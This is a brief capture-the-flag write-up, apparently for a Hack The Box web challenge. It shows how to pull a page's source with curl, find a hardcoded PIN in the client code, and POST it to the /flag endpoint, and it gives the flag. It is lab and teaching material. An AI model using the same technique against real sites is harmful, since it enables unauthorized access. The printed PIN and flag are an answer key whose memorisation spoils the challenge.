

> Intergalactic Ministry of Spies tested Pandora's movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?


## The Pwn

Get the page source code:
```bash
curl <ip>:<port> -o index.html
```

Find the `correctPin` variable and fill it into the webapp or send a post request with the correct pin.

```bash
curl 'http://<ip>:<port>/flag' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Pragma: no-cache' \
  -H 'Sec-GPC: 1' \
  --data-raw '{"pin":"8291"}' \
  --compressed
```

## The Flag

```
HTB{V13w_50urc3_c4n_b3_u53ful!!!}